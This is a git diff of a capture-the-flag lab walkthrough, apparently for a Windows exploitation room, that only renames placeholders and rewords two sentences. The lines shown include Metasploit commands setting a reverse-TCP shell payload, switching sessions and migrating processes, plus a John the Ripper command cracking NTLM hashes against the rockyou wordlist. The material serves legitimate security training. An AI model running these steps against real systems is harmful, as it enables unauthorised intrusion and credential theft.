@@ -144,7 +144,7 @@ show options
 ![image](https://user-images.githubusercontent.com/14150485/170932504-69f81f87-cb75-4051-9815-ed120e88e63d.png)
 
 ```
-set RHOSTS REMOTEIP
+set RHOSTS REMOTE_IP
 ```
 The answer is:
 ```
@@ -161,7 +161,7 @@ RHOSTS
 
 <br />
 
-As mentioned in the task description, this step is optional - No harm in learning something new though.
+As mentioned in the task description this step is optional, however learning something new is always a good idea!
 ```
 set payload windows/x64/shell/reverse_tcp
 ```
@@ -244,7 +244,7 @@ sessions
 
 We can now proceed to update the value:
 ```
-set SESSION SESSIONNUMBER
+set SESSION SESSION_NUMBER
 ```
 That's it, we should now be ready to run the exploit.
 
@@ -274,7 +274,7 @@ No answer needed
 
 We can switch to our active session using the following command:
 ```
-sessions -i SESSIONNUMBER
+sessions -i SESSION_NUMBER
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170939666-6af9a594-23be-457a-97a0-1bf67a2ee72c.png)
 
@@ -324,7 +324,7 @@ No answer needed
 
 We might need to try multiple processes for this until we can successfully migrate to one.
 ```
-migrate PROCESSID
+migrate PROCESS_ID
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170947190-405b831f-0220-4ecf-baf2-097dd9c8e46a.png)
 
@@ -359,13 +359,13 @@ Jon
 
 <br />
 
-Since this is a Windows machine, we can expect to see NT hashes (also known as NTLM). We can confirm this by checking the hash against a hash identifier at https://hashes.com/en/tools/hash_identifier.
+Since this is a Windows machine, we can expect to see NT hashes (also known as NTLM). We can confirm this by running the hash against a hash identifier. My personal favorite is https://hashes.com/en/tools/hash_identifier.
 
 ![image](https://user-images.githubusercontent.com/14150485/170950699-7aedfbef-129d-4232-8ff4-a6f5ae7fd715.png)
 
 Now that we have confirmed this to be an NTLM hash we can easily proceed to crack it using John The Ripper. To do so, create a file at a location of your choice and paste the hash into it. Then let John do what he does best!
 ```
-john --format=NT --wordlist=ROCKYOUFOLDERHERE/rockyou.txt FILENAMEHERE
+john --format=NT --wordlist=ROCKYOU_PATH/rockyou.txt HASH_FILE
 ```
 
 ![image](https://user-images.githubusercontent.com/14150485/170951262-ecea0adc-561b-46e9-a305-aa518cb7361d.png)
